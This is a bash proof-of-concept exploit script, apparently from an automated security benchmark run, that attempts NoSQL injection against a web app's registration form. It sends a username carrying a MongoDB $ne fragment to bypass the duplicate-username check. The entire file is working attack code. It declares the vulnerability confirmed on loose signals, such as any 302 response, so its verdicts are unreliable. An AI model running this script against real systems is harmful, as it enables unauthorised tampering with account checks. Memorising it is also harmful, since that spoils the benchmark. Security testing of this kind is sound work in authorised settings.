#!/bin/bash
# POC: NoSQL Injection to bypass duplicate username check in registration form by injecting MongoDB $ne operators
# Target: ./repo
# Created: 2025-11-10T14:45:39.229Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# NoSQL Injection in Registration Form - Duplicate Username Check Bypass
# This POC demonstrates bypassing the duplicate username validation check
# through NoSQL injection operators

TARGET_URL="${1:-http://localhost:3000}"
TIMESTAMP=$(date +%s)
TEST_USER="nosql_bypass_${TIMESTAMP}"

echo "[*] NoSQL Injection in Registration - Duplicate Username Check Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Create initial user
echo "[Step 1] Creating initial user: $TEST_USER"
INITIAL_RESPONSE=$(curl -s -X POST "$TARGET_URL/register" \
  -d "username=$TEST_USER&password=test123&first_name=Test&last_name=User&email=test1_${TIMESTAMP}@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$INITIAL_RESPONSE" | tail -n 1)
BODY=$(echo "$INITIAL_RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
  echo "[+] Initial user created successfully (HTTP $HTTP_CODE)"
else
  echo "[-] Failed to create initial user (HTTP $HTTP_CODE)"
  exit 1
fi

# Step 2: Try normal duplicate registration (baseline)
echo ""
echo "[Step 2] Attempting normal duplicate username registration (baseline)"
DUPLICATE_RESPONSE=$(curl -s -X POST "$TARGET_URL/register" \
  -d "username=$TEST_USER&password=different&first_name=Test&last_name=User&email=test2_${TIMESTAMP}@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$DUPLICATE_RESPONSE" | tail -n 1)
BODY=$(echo "$DUPLICATE_RESPONSE" | head -n -1)

if echo "$BODY" | grep -q "Username already exists"; then
  echo "[+] Duplicate check is working (correctly rejected with 'Username already exists')"
  BASELINE_WORKS=1
else
  echo "[-] Baseline duplicate check did not return expected message"
  BASELINE_WORKS=0
fi

# Step 3: Try with NoSQL injection
echo ""
echo "[Step 3] Attempting NoSQL injection bypass with \$ne operator"
echo "[*] Injecting payload: $TEST_USER\",\"\$ne\":\"$TEST_USER"

# Using --data-urlencode for proper encoding of the injection payload
INJECTION_RESPONSE=$(curl -s -X POST "$TARGET_URL/register" \
  --data-urlencode "username=$TEST_USER\",\"\$ne\":\"$TEST_USER" \
  -d "password=injected&first_name=Injected&last_name=User&email=test3_${TIMESTAMP}@example.com" \
  -w "\n%{http_code}")

HTTP_CODE=$(echo "$INJECTION_RESPONSE" | tail -n 1)
BODY=$(echo "$INJECTION_RESPONSE" | head -n -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body (first 500 chars):"
echo "$BODY" | head -c 500
echo ""
echo ""

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABILITY CONFIRMED: NoSQL Injection bypassed duplicate username check!"
  echo "[+] Account created despite duplicate username (HTTP $HTTP_CODE with redirect)"
  VULN_FOUND=1
elif echo "$BODY" | grep -q "Username already exists"; then
  echo "[-] Injection payload was still rejected (not vulnerable)"
  VULN_FOUND=0
else
  # Could be 200 with redirect or other behavior
  if [ "$HTTP_CODE" = "200" ] && ! echo "$BODY" | grep -q "Username already exists"; then
    echo "[+] VULNERABILITY CONFIRMED: NoSQL Injection bypassed duplicate username check!"
    echo "[+] Account created with injected payload (HTTP $HTTP_CODE)"
    VULN_FOUND=1
  else
    echo "[-] Unclear response (HTTP $HTTP_CODE)"
    VULN_FOUND=0
  fi
fi

echo ""
echo "[*] ========== SUMMARY =========="
if [ "$BASELINE_WORKS" = "1" ] && [ "$VULN_FOUND" = "1" ]; then
  echo "[+] NoSQL Injection vulnerability CONFIRMED"
  echo "[+] Duplicate check works with normal input but fails with NoSQL operators"
  exit 0
else
  echo "[-] Could not confirm NoSQL injection vulnerability"
  exit 1
fi